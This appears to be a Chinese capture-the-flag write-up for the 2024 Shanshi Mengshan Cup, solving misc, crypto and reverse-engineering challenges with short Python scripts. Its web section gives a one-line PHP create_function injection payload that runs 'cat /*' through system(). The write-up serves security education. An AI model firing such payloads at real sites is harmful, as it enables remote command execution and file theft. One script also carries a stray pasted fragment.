---
title: 2024首届“山石·蒙山杯”网络安全大赛WriteUp
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247506813&idx=1&sn=72c979455b2786a77287793a720c4399&chksm=fa520ec3cd2587d5526ad6173aedf63399f55ec9b6c2abdd5df42630bc778adb80af68f37877&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2024-07-03
fetch_date: 2025-10-06T17:44:02.029902
---

# 2024首届“山石·蒙山杯”网络安全大赛WriteUp

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzWiadB7zWmAjgsa6XMUCuPMGnA3x2MMU56DN6Pv25G3KChSlyFNb22WA/0?wx_fmt=jpeg)

# 2024首届“山石·蒙山杯”网络安全大赛WriteUp

原创

NEURON

山石网科安全技术研究院

**MISC**

**01 签到m13c**

赛题描述：简单签个到

解题思路：

直接随波逐流工具

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzIYwJdgI3wv7rUZBfIKL1O0P2PZBiaPIDoHq6YIQIdUr7pE3UkicYSgjA/640?wx_fmt=png&from=appmsg)

或者写脚本，凯撒密码解密

```
 def caesar_decrypt(ciphertext, shift):
    decrypted_text = ""
    for char in ciphertext:
        if char.isalpha():
            shift_amount = shift % 26
            if char.islower():
                decrypted_text += chr((ord(char) - shift_amount - 97) % 26 + 97)
            else:
                decrypted_text += chr((ord(char) - shift_amount - 65) % 26 + 65)
        else:
            decrypted_text += char
    return decrypted_text

ciphertext = "eccgxj{Nywx_e_W1qtpi_Q13g}"
shift = 4
print(caesar_decrypt(ciphertext, shift))
```

ayyctf{Jut\_a\_S1mple\_M13c}

**02 shark**

赛题描述：黑客监听了小岩输入的flag...

解题思路：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzp1j0v3tZ5UkLVZiaib2lnsmeDIsXxpbNIEJCIZz6MaiceR1uVpwoRoYOw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzzXDPnI9iclRTicfFHZ7jkw8DXkg5LT1xSOpoduMHkGJrakeOiaDwIuNAw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzqeyGS5d8jVjybmZ2mWaAfhKwdTx7ryaia4OEwyzib58jjHRynRQc3HhA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzFGQDXGvPRX86PSdIREGOSlF2Dtj07I9s4CS5yX8YV2PkMnqricQWFoQ/640?wx_fmt=png&from=appmsg)

按照已给的usb键本找到对应按键，打出flag

04 - a  1c - y  06 - c  17-t  09-f  2f-{  0b-h

20-3  0f-l  0f-l 27-0 2d-\_   0e-k  08-e 1c-y

2d-\_ 05-b 27-0 21-4 15-r 07-d 30-}

依次类推得到

ayyctf{h3ll0\_key\_b04rd}

**03 easymisc**

赛题描述：黑客监听了小岩输入的flag...

解题思路：

尝试解压文件

①解压需要密码

发现解压需要输入密码

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzhPjGCZBDkckib9iaiafbxic5JGXpFrfnynepb79kyIHZtszLLVFrbl0poQ/640?wx_fmt=png&from=appmsg)

并且压缩包里有密码, 只有4个字节, 那么可以直接进行压缩包密码爆破 或者对pwd.txt进行CRC爆破即可得出里面的内容

②CRC爆破

编写py脚本:

```
import zlib
import itertools
import string

def brute_force_crc32(target_crc32):
    # 所有可见的ASCII字符
    visible_ascii_chars = string.printable[:-6]  # string.printable includes 100 characters, the last 6 are whitespace

    # 生成所有可能的4个字符组合
    for candidate in itertools.product(visible_ascii_chars, repeat=4):
        candidate_str = ''.join(candidate)
        candidate_crc32 = zlib.crc32(candidate_str.encode())

        # 检查CRC32是否匹配
        if candidate_crc32 == target_crc32:
            return candidate_str

    return None

# 目标CRC32值（例如）
target_crc32 = 0x475EDC53

# 执行爆破
result = brute_force_crc32(target_crc32)

if result:
    print(f"Found matching string: {result}")
    print(f"CRC32: {hex(zlib.crc32(result.encode()))}")
else:
    print("No matching string found.")r_decrypt(ciphertext, shift))
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzh9DYsiaul1fkTvxHFBryEtlOORj5qdzYtFAfsKcAw5s1OBiaLSU2tSsg/640?wx_fmt=png&from=appmsg)

③pyc反编译

因为是3.8版本的, 可以使用任意反编译工具对这个pyc进行反编译

```
some_encrypt = lambda text, shift: ''.join([chr(((ord(char) - ord('A' if 'A' <= char <= 'Z' else 'a') + shift) % 26) + ord('A' if 'A' <= char <= 'Z' else 'a')) if char.isalpha() else char for char in text])

if __name__ == '__main__':
  plaintext = "Hello, Wordl!"
  shift = 4
  print("Encrypted:", some_encrypt(plaintext, shift))
```

这个算法是凯撒密码, 偏移量是4

所以flag是ayyctf{easy\_2\_recognize}

**WEB**

**01 babycode**

赛题描述：代码执行

解题思路：

```
?a=create_function&v=};system('cat /*');/*
```

**CRYPTO**

**01 babyrsa**

赛题描述：你能从泄露的数据中获得什么吗？

解题思路：

dp泄露的一个简单的爆破脚本

```
import gmpy2 as gp

e  = 65537
n  = 81341453801740456556711750595393167570498597994503221907699829282377977102604445084623116531103443209109475312614340864570279365580136143868105557106203760471966244404904186019427097707682913918133188187694525599480573859216404219888072000234473884057741952626452708508336716518206503482903090272609806850687
dp = 2267875620239785100872840243404829420353764780117016215398169925234158712375753022894332259383627631211170491663842059628563952588889226976261124820132019
c  = 68743536063933676791554582156643217036584340763549551341651123137408676663330867031805776293599664745388644814744743397678920124639027237165565280318792523853633900033745253101330130605070263258464033420967992546641879680350423536048243772521159824941551114901904186100713621940034127376767770063434480692464

for x in range(1, e):
 if(e*dp%x==1):
  p=(e*dp-1)//x+1
  if(n%p!=0):
   continue
  q=n//p
  phin=(p-1)*(q-1)
  d=gp.invert(e, phin)
  m=gp.powmod(c, d, n)
  if(len(hex(m)[2:])%2==1):
   continue
  print('--------------')
  print(m)
  print(hex(m)[2:])
  print(bytes.fromhex(hex(m)[2:]))
```

b'ayyctf{ac43b282-693b-4719-ae1d-99f9e3143f32}'

**02 vigenere**

赛题描述：维吉尼亚密码是一种简单的多表代换密码。

解题思路：

维吉尼亚密码，密码表换成了小写字母+{}，通过固定的flag头爆破密钥，再解密。

```
import random
import string
dicts = string.ascii_lowercase +"{}"
#print(dicts)

key = (''.join([random.choice(dicts) for i in range(4)])) * 8
enc='tsejk}gbxyiutfchpm}ylm}a}amuxlmg'
known='ayyctf{'

#print(len(enc))
key=''
for i in range(4):
    key+=dicts[(ord(enc[i])-ord(known[i]))%28]
#print(key)

key=key*8

import string

# 初始化空字典
index_dict = {}

# 使用循环将 a-z 对应到 0-25
for i, letter in enumerate(string.ascii_lowercase):
    index_dict[letter] = i

# 将 '{' 对应到 26，将 '}' 对应到 27
index_dict['{'] = 26
index_dict['}'] = 27

#print(index_dict)

flag=''
for i in range(len(enc)):
    flag+=dicts[(index_dict.get(enc[i])-index_dict.get(key[i]))%28]

print(flag)
```

ayyctf{wecanalwaystrustvigenere}

**REVERSE**

**01 easycpp**

赛题描述：输入flag进行验证

解题思路：

拖入IDA搜索字符串, 可以定位到关键函数:

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzsCANBan5OHwjgokicOyRo7e2oH9fr5RGEQzQ5lMtHDfJN359P2mw7hw/640?wx_fmt=png&from=appmsg)

查看关键逻辑，在函数开头可以看到:

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKziad0osvqVnv6lj0ofY3m3Wia4xXag8M36ibXzkl0OAayAAEmAyyD0fccw/640?wx_fmt=png&from=appmsg)

```
 void *Block; // [rsp+20h] [rbp-58h] BYREF
 __int64 v3; // [rsp+28h] [rbp-50h]
```

Block和v3在栈上是挨着的, 且调用了sub\_1400B5650（&unk\_1400BB560, &Block）；很明显sub\_1400B5650就是读入函数，Block就是std::string，只是IDA把std::string拆成几部分了，v3就是std::string的length成员。也就是说输入的flag是32个字节，显然逻辑是以下伪代码：

```
unsigned char bytes_[32] = { 0xc5, 0x8f, 0xd9, 0xd8, 0xda, 0xdf, 0x8f, 0xd8, 0x8a, 0x88, 0x8a, 0xdd, 0xc5, 0x8f, 0x8f, 0xd9, 0x8a, 0x8f, 0xda, 0xda, 0xd2, 0x8f, 0xd2, 0xdd, 0x89, 0x8a, 0xde, 0xc5, 0xd9, 0xd8, 0xc5, 0xda };
for (int i = 0; i < 32; i++)
{
  unsigned char one_byte = (input[i] - 1) ^ 0xEA;
  if (one_byte != bytes_[i])
  {
    puts("try again");
    return false;
  }
}
puts("great");
```

那么flag就是(bytes\_[32])^0xEA+1，写python脚本：

```
bytes_ = [0xc5, 0x8f, 0xd9, 0xd8, 0xda, 0xdf, 0x8f, 0xd8, 0x8a, 0x88, 0x8a, 0xdd, 0xc5, 0x8f, 0x8f, 0xd9, 0x8a, 0x8f, 0xda, 0xda, 0xd2, 0x8f, 0xd2, 0xdd, 0x89, 0x8a, 0xde, 0xc5, 0xd9, 0xd8, 0xc5, 0xda]

flag = ""
for one_byte in bytes_:
  flag_one_char = (one_byte ^ 0xEA) + 1
  flag += chr(flag_one_char)
print(flag)
# 0f4316f3aca80ff4af119f98da504301
```

所以flag就是ayyctf{0f4316f3aca80ff4af119f98da504301}

**02 easygui**

赛题描述：尝试从用纯WIN32 API写的GUI程序中找出flag

解题思路：

#easygui

>flag: ayyctf{you\_know\_debug}

①运行初探

点击tips出现提示'点击5000次try按钮即可显示flag'：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzxnqLQGHMIOGJiaB5tp7y3ibENHd2opAvVT3Q5FG5EPgsZd29xasjNVpw/640?wx_fmt=png&from=appmsg)

那肯定是有一个判断条件，click\_num >= 5000次就显示flag。

②静态分析

既然是WIN32 API写的那就肯定会先[注册一个窗口类]（https://learn.microsoft.com/en-us/windows/win32/learnwin32/creating-a-window），在注册时会指定窗口过程函数，在窗口过程函数中处理消息

用IDA分析一下：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRb5NQugOicOacCgia7jsgbKzOOpJ9ibfrEfhpVgY32ylRPyAkDVErOxEICjfplzhLNKUqLLI7aMRibsg/640?wx_fmt=png&from=appmsg)

在WinMain里就看到了RegisterClassExW，并且发现窗口过程函数是sub\_404C20。

看到如下代码：

![](https://mmbi...